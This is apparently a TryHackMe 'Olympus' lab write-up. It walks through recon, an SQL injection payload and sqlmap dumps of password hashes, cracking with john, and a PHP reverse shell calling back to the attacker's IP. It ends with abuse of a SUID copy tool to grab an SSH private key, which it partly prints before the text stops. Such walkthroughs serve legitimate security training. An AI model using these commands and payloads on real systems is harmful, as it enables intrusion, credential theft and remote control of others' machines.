# Olympus
link: https://tryhackme.com/room/olympusroom
target: 10.10.207.20


## Recon
### NMAP
The recon start with a classic nmap scan with '-sV' (Probe open ports to determine service/version info) and '-sC' (equivalent to --script=default):

```bash
nmap -sC -sV 10.10.207.20

PORT   STATE SERVICE VERSION
22/tcp open  ssh 	OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 0a7814042cdf25fb4ea21434800b8539 (RSA)
|   256 8d5601ca55dee17c6404cee6f1a5c7ac (ECDSA)
|_  256 1fc1be3f9ce78e243334a644af684c3c (ED25519)
80/tcp open  http	Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://olympus.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
---
Two ports are open in the initial nmap scan.
We can add the DNS name to our /etc/hosts file :

```bash
echo "10.10.207.20  olympus.thm" | sudo tee -a /etc/hosts
```
---
### Browse Website
Now, we can try to browse to the page http://olympus.thm/
> http://olympus.thm
![http://olympus.thm/](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_olympus.thm.png?raw=true)
> Wappalyzer
![Wappalyzer](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_wappalyzer_olympus.thm.png?raw=true)

We can add some informations to our notes:
> mail: root@the-it-departement
> user: root
> domain: the-it-departement


Before launch a gobuster to fuzz the main page, we can try some path like 'index.html' or 'index.php' to check extension file :

> index.html
```bash
curl http://olympus.thm/index.html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at olympus.thm Port 80</address>
</body></html>
```
> index.php
```
curl http://olympus.thm/index.php 
<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
  <meta charset="utf-8">
  <meta name="description" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Olympus</title>
  <!-- Meta -->
  <meta name="Content-Language" content="en">
  <meta name="Keywords" content="AperiSolve, Apérisolve, Aperi'Solve, Apéri'Solve, Zeecka">
  <meta name="Author" content="Zeecka">
  <meta name="Robots" content="all">
  <meta name="theme-color" content="#42f4c5">
  <link rel="shortcut icon" type="image/x-icon" href="http://olympus.thm/static/images/watermelon.svg" />
  <link rel="icon" type="image/png" href="http://olympus.thm/static/images/watermelon.svg" />
  <link rel="preconnect" href="https://fonts.gstatic.com">
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
  <link href="http://olympus.thm/static/normalize.css" rel="stylesheet">
  <link href="http://olympus.thm/static/style.css" rel="stylesheet">
  <script src="http://olympus.thm/static/particles.min.js"></script>
</head>
<body>
  <br></br>
  <div id="parentmain">
    <div id="parenthome">
      <h1 id="logo">Olympus v2</h1>
      <br></br>
      <br></br>
      <br></br>
      <br></br>
      <br></br>
      <br></br>
      <div id="mainform">
	<div id="file-drag">
            <div id="start">
              <div>The website is still under developpment.</div>
              <div id="notimage" class="hidden">If support is needed, please contact root@the-it-department. The old version of the website is still accessible on this domain.</div>
            </div>
      </div>
  <div id="particles-js"></div>
  <script>particlesJS.load('particles-js', 'http://olympus.thm/static/particles.json', function () { });</script>
</body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

</html>
```
We can see the .php extension works, so we can add '-x php' to our gobuster command to find some .php files :

---
### GOBUSTER

```bash
gobuster dir -u http://olympus.thm/ -w /usr/share/wordlists/dirb/common.txt -x php 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://olympus.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/03/01 11:09:31 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/~webmaster           (Status: 301) [Size: 315] [--> http://olympus.thm/~webmaster/]
/index.php            (Status: 200) [Size: 1948]
/index.php            (Status: 200) [Size: 1948]
/javascript           (Status: 301) [Size: 315] [--> http://olympus.thm/javascript/]
/phpmyadmin           (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/static               (Status: 301) [Size: 311] [--> http://olympus.thm/static/]
Progress: 9120 / 9230 (98.81%)
===============================================================
2023/03/01 11:10:01 Finished
===============================================================
```

---
We have find some path, so go check if you find some information on  http://olympus.thm/~webmaster/

![http://olympus.thm/~webmaster/](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_Victor_CMS.png?raw=true)

Great, we have find some interesting stuff, like search and login fonction.

---
### SEARCHSPLOIT

Let's first check if there are any **Victor CMS** vulnerabilities in **exploit-db** with **searchsploit** command line tools:

```bash
searchsploit "Victor CMS"                                         
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                     |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Victor CMS 1.0 - 'add_user' Persistent Cross-Site Scripting                                                                                                                        | php/webapps/48511.txt
Victor CMS 1.0 - 'cat_id' SQL Injection                                                                                                                                            | php/webapps/48485.txt
Victor CMS 1.0 - 'comment_author' Persistent Cross-Site Scripting                                                                                                                  | php/webapps/48484.txt
Victor CMS 1.0 - 'post' SQL Injection                                                                                                                                              | php/webapps/48451.txt
Victor CMS 1.0 - 'Search' SQL Injection                                                                                                                                            | php/webapps/48734.txt
Victor CMS 1.0 - 'user_firstname' Persistent Cross-Site Scripting                                                                                                                  | php/webapps/48626.txt
Victor CMS 1.0 - Authenticated Arbitrary File Upload                                                                                                                               | php/webapps/48490.txt
Victor CMS 1.0 - File Upload To RCE                                                                                                                                                | php/webapps/49310.txt
Victor CMS 1.0 - Multiple SQL Injection (Authenticated)                                                                                                                            | php/webapps/49282.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

**Searchsploit** shows me several known exploits, let's try first the exploit for the **'Search' SQL Injection**
```bash
cat /usr/share/exploitdb/exploits/php/webapps/48734.txt           
# Exploit Title: Victor CMS 1.0 - 'Search' SQL Injection
# Date: 2020-08-04
# Exploit Author: Edo Maland
# Vendor Homepage: https://github.com/VictorAlagwu/CMSsite
# Software Link: https://github.com/VictorAlagwu/CMSsite/archive/master.zip
# Version: 1.0
# Tested on: XAMPP / Windows 10

-------------------------------------------------------------------------------------------------------------------------------------
# Discription:
# The Victor CMS v1.0 application is vulnerable to SQL injection via the 'search' parameter on the search.php page.

# Feature: Search
# Vulnerable file: search.php
# Vulnerable parameter :
	- search
# PoC

Url : http://example.com/CMSsite/search.php
Methode : Post (search="[SQLi]"&submit)

Payload : 1337'union+select+1,2,version(),database(),5,6,7,8,9,10 -- -

# Burpsuite Requests

POST /CMSsite/search.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: id,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://example.com
Connection: close
Referer: http://example.com/CMSsite/search.php
Cookie: PHPSESSID=lu0nb6l63bleu39pbjf5a954p9
Upgrade-Insecure-Requests: 1

search=1337'union+select+1,2,version(),databases(),5,6,7,8,9,10%20--%20-&submit=

# Sqlmap Command

sqlmap -u "http://example.com/CMSsite/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3
```


---
### BURP

Let's open **Burp** to try the **'search' SQL Injection** exploit:
![Burp_SQLI_search](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/BURP_search_SQLI.png?raw=true)


It works!


---
### SQLMAP
Now we can run sqlmap :

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:53:01 /2023-03-01/

[11:53:01] [DEBUG] cleaning up configuration parameters
[11:53:01] [DEBUG] setting the HTTP timeout
[11:53:01] [DEBUG] setting the HTTP User-Agent header
[11:53:01] [DEBUG] loading random HTTP User-Agent header(s) from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[11:53:01] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.20) Gecko/20081217 Firefox(2.0.0.20)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[11:53:01] [DEBUG] creating HTTP requests opener object
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[11:53:01] [DEBUG] used the default behavior, running in batch mode
[11:53:01] [INFO] resuming back-end DBMS 'mysql' 
[11:53:01] [DEBUG] resolving hostname 'olympus.thm'
[11:53:01] [INFO] testing connection to the target URL
[11:53:02] [DEBUG] declared web page charset 'utf-8'
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=uet6a1mao4v...fko6o9891g'). Do you want to use those [Y/n] Y
[11:53:02] [DEBUG] used the default behavior, running in batch mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: search=1337' OR NOT 8708=8708#&submit=
    Vector: OR NOT [INFERENCE]#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: search=1337' AND GTID_SUBSET(CONCAT(0x716a767071,(SELECT (ELT(3391=3391,1))),0x7170627671),3391)-- RlNq&submit=
    Vector: AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=1337' AND (SELECT 5227 FROM (SELECT(SLEEP(5)))Btsm)-- LvuX&submit=
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: MySQL UNION query (NULL) - 10 columns
    Payload: search=1337' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767071,0x79476663707a55546148776255486644694d567a5163484b4f464f74476a49794e71766d51646153,0x7170627671),NULL,NULL,NULL#&submit=
    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL#
---
[11:53:02] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: PHP, Apache 2.4.41
back-end DBMS: MySQL >= 5.6
[11:53:02] [INFO] fetching database names
[11:53:02] [DEBUG] resuming configuration option 'string' ('result')
[11:53:02] [DEBUG] performed 0 queries in 0.00 seconds
available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys

[11:53:02] [INFO] fetched data logged to text files under '/home/rawmain/.local/share/sqlmap/output/olympus.thm'

[*] ending @ 11:53:02 /2023-03-01/
```


We have just found several databases, let's try to find some information in the **olympus** database:

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --batch --tables olympus
...
Database: olympus
[6 tables]
+------------------------------------------------------+
| categories                                           |
| chats                                                |
| comments                                             |
| flag                                                 |
| posts                                                |
| users                                                |
+------------------------------------------------------+
...
```

We can try to dump the '**flag**' table:

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --batch --dump -D olympus -T flag
...
Database: olympus
Table: flag
[1 entry]
+---------------------------+
| flag                      |
+---------------------------+
| flag{Sm4rt!_k33P_d1gGIng} |
+---------------------------+
...
```

**Great! We have found the first flag !**

Let's stay focused and keep looking for other information in the database, like the '**users**' table :

```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --batch --dump -D olympus -T users
...
Database: olympus
Table: users
[3 entries]
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus     |
| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root           |
| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus           |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
```


---
We have just found some interesting informations: 
- **Users** :
	- prometheus
	- root
	- zeus
- **Mail addresses**:
	- prometheus@olympus.thm
	- root@chat.olympus.thm
	- zeus@chat.olympus.thm
- **Users passwords hash**:
	- $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
	- $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
	- $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC
- **New subdomain**:
	- chat.olympus.thm

We create a **users.hash** file which contains the hashes of the users to try to crack them later.

```bash
cat users_hash.txt                                          
$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C
$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK
$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC
```

add the new subdomain to our **/etc/hosts** file:

```bash
cat /etc/hosts

# tryHackMe
10.10.207.20  olympus.thm chat.olympus.thm
```

add the users found in a **databaseUsers.txt** file:

```bash
cat databaseUsers.txt                             
prometheus
root
zeus
```


---
### HASHID
Try to identify the hash format  with **hashid**:
```bash
hashid users_hash.txt
--File 'hash/users_hash.txt'--
Analyzing '$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
Analyzing '$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
Analyzing '$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
--End of file 'hash/users_hash.txt'-- 
```


---
### JOHN
Crack **users_hash.txt** file:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt users_hash.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
summertime       (?)   
...
```

---
John have cracked a hash, we can try to login to the chat.olympus.thm page with this creds:
> user: prometheus
> password: summertime

### Webpage Login: http://olympus.thm/~webmaster/admin/
![Login_webmaster Page](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_webmaster_login.png?raw=true)

![Succes webmaster_Login !](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_webmasterAdminPage.png?raw=true)


### Webpage Login: http://chat.olympus.thm/home.php

![Login chat.olympus_Page](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_Login_chat.png?raw=true)

![Succes chat.olympus_Login !](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_Olympus_chatApp.png?raw=true)


---
---
### GOBUSTER
*http://chat.olympus.thm/*
```bash
gobuster dir -u http://chat.olympus.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://chat.olympus.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/01 13:44:47 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 322] [--> http://chat.olympus.thm/uploads/]
/static               (Status: 301) [Size: 321] [--> http://chat.olympus.thm/static/]
/javascript           (Status: 301) [Size: 325] [--> http://chat.olympus.thm/javascript/]
/phpmyadmin           (Status: 403) [Size: 281]

```

---
so, recap:
- we have a web page where we can **upload a file**: http://chat.olympus.thm/home.php
- we found the **path** to the **uploaded file**: http://chat.olympus.thm/home.php

The next step is to check if we can upload a .php file that would contain a reverseshell, then try to access it in the uploads folder

---
### PHP REVERSE SHELL
- Get the php reverse shell from PentestMonkey : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
- Check your ip with ifconfig :
 ```bash
ifconfig tun0
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.18.48.143  netmask 255.255.128.0  destination 10.18.48.143
        inet6 fe80::d061:90af:e69e:7d86  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 553269  bytes 254033107 (242.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 540631  bytes 78222105 (74.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
- Change the IP and the Port in the php_reverse_shell.php :
```bash
$ip = '10.18.48.143';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
```
- Uplaod the php_reverse_shell.php:
![Upload_reverse_shell](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_ReverseShellUpload.png?raw=true)
![Upload_reverse_shell_Succes](https://github.com/RawMain121/writeups/blob/sandboxInit/tryHackMe/room/Olympus/data/HTTP_ReverseShellUpload_Succes.png?raw=true)



### CURL
Well, we have uploaded the **php_reverse_shell.php**, we now need to find the file in the path **http://chat.olympus.thm/uploads/**
Unfortunately, the page returns nothing 
```bash
curl http://chat.olympus.thm/uploads/ -v3
Warning: Ignores instruction to use SSLv3
*   Trying 10.10.207.20:80...
* Connected to chat.olympus.thm (10.10.207.20) port 80 (#0)
> GET /uploads/ HTTP/1.1
> Host: chat.olympus.thm
> User-Agent: curl/7.87.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Wed, 01 Mar 2023 13:10:35 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Last-Modified: Fri, 25 Mar 2022 09:19:54 GMT
< ETag: "0-5db0777349cbc"
< Accept-Ranges: bytes
< Content-Length: 0
< Content-Type: text/html
< 
* Connection #0 to host chat.olympus.thm left intact
```
---
We can look for information to understand how the upload works. let's try to exploit the SQL Injection found earlier:
### SQLMAP
```bash
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent --batch --dump -T chats -D olympus
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:15:27 /2023-03-01/

[14:15:27] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_2; en-us) AppleWebKit/525.7 (KHTML, like Gecko) Version/3.1 Safari/525.7' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[14:15:27] [INFO] resuming back-end DBMS 'mysql' 
[14:15:27] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=jdlecfqkvv0...ralefvvp30'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: search=1337' OR NOT 8708=8708#&submit=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: search=1337' AND GTID_SUBSET(CONCAT(0x716a767071,(SELECT (ELT(3391=3391,1))),0x7170627671),3391)-- RlNq&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=1337' AND (SELECT 5227 FROM (SELECT(SLEEP(5)))Btsm)-- LvuX&submit=

    Type: UNION query
    Title: MySQL UNION query (NULL) - 10 columns
    Payload: search=1337' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767071,0x79476663707a55546148776255486644694d567a5163484b4f464f74476a49794e71766d51646153,0x7170627671),NULL,NULL,NULL#&submit=
---
[14:15:28] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41, PHP
back-end DBMS: MySQL >= 5.6
[14:15:28] [INFO] fetching database names
available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys

[14:15:28] [INFO] fetching columns for table 'chats' in database 'olympus'
[14:15:28] [INFO] fetching entries for table 'chats' in database 'olympus'
Database: olympus
Table: chats
[5 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| dt         | msg                                                                                                                                                             | file                                 | uname      |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | <blank>                              | prometheus |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | <blank>                              | zeus       |
| 2023-03-01 | Upload_reverse_shell                                                                                                                                            | <blank>                              | prometheus |
| 2023-03-01 | Attached : php_reverse_shell.php                                                                                                                                | 8a29591b2bbf854d5f90d9fbec61d3d4.php | prometheus |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+

[14:15:28] [INFO] table 'olympus.chats' dumped to CSV file '/home/freekali/.local/share/sqlmap/output/olympus.thm/dump/olympus/chats.csv'
[14:15:28] [INFO] fetched data logged to text files under '/home/freekali/.local/share/sqlmap/output/olympus.thm'

[*] ending @ 14:15:28 /2023-03-01/
```
Ok, we have find the 'php_reverse_shell.php' file, the upload are a different name :
**8a29591b2bbf854d5f90d9fbec61d3d4.php**

---
Before accessing the file, we launch a netcat to handle the reverse shell:
### NETCAT
```bash
nc -lnvp 1337
listening on [any] 1337 ...
```
### CURL 
```bash
curl http://chat.olympus.thm/uploads/8a29591b2bbf854d5f90d9fbec61d3d4.php
```
### REVERSE SHELL 
```bash
nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.18.48.143] from (UNKNOWN) [10.10.207.20] 49132
Linux olympus 5.4.0-109-generic #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 13:20:10 up  4:12,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
$ 
```
**WE HAVE A SHELL !**

---
Keep focus, i try to have a good shell :
```bash
$ bash -i
bash: cannot set terminal process group (762): Inappropriate ioctl for device
bash: no job control in this shell
www-data@olympus:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Inside the nc session, run  CTRL+Z and paste this *(change the size for your terminal)* :
```bash
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 65 columns 170; reset;
```
Then run ```bash -i``` to get a good Full TTY.

We can try to find some information inside the zeus directory :
```bash
www-data@olympus:/$ cd home/zeus/
www-data@olympus:/home/zeus$ ls
snap  user.flag  zeus.txt
www-data@olympus:/home/zeus$ cat user.flag 
flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}
www-data@olympus:/home/zeus$ 
```

**Great**, we have find an other flag !


---
# PRIVESC

I usually run a linPEAS, but first I try first to manually enumerate with this commande :

```find / -perm -u=s -type f 2>/dev/null```

```bash
www-data@olympus:/home/zeus$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/cputils
/usr/bin/sudo
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/pkexec
/usr/bin/su
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/newgrp
/snap/snapd/15534/usr/lib/snapd/snap-confine
/snap/snapd/16292/usr/lib/snapd/snap-confine
/snap/core20/1434/usr/bin/chfn
/snap/core20/1434/usr/bin/chsh
/snap/core20/1434/usr/bin/gpasswd
/snap/core20/1434/usr/bin/mount
/snap/core20/1434/usr/bin/newgrp
/snap/core20/1434/usr/bin/passwd
/snap/core20/1434/usr/bin/su
/snap/core20/1434/usr/bin/sudo
/snap/core20/1434/usr/bin/umount
/snap/core20/1434/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1434/usr/lib/openssh/ssh-keysign
/snap/core20/1518/usr/bin/chfn
/snap/core20/1518/usr/bin/chsh
/snap/core20/1518/usr/bin/gpasswd
/snap/core20/1518/usr/bin/mount
/snap/core20/1518/usr/bin/newgrp
/snap/core20/1518/usr/bin/passwd
/snap/core20/1518/usr/bin/su
/snap/core20/1518/usr/bin/sudo
/snap/core20/1518/usr/bin/umount
/snap/core20/1518/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1518/usr/lib/openssh/ssh-keysign
```

```bash
www-data@olympus:/home/zeus$ ls -la /usr/bin/cputils
-rwsr-xr-x 1 zeus zeus 17728 Apr 18  2022 /usr/bin/cputils
```

**cputils** are really interesting because it can be run as **zeus** and its functionality is copying files, maybe like the **private ssh key** ?
```bash
www-data@olympus:/home/zeus$ cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: ./.ssh/id_rsa

Enter the Name of Target File: id_rsa

File copied successfully.
www-data@olympus:/home/zeus$ ls
id_rsa	snap  user.flag  zeus.txt
www-data@olympus:/home/zeus$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABALr+COV2
NabdkfRp238WfMAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQChujddUX2i
WQ+J7n+PX6sXM/MA+foZIveqbr+v40RbqBY2XFa3OZ01EeTbkZ/g/Rqt0Sqlm1N38CUii2
eow4Kk0N2LTAHtOzNd7PnnvQdT3NdJDKz5bUgzXE7mCFJkZXOcdryHWyujkGQKi5SLdLsh
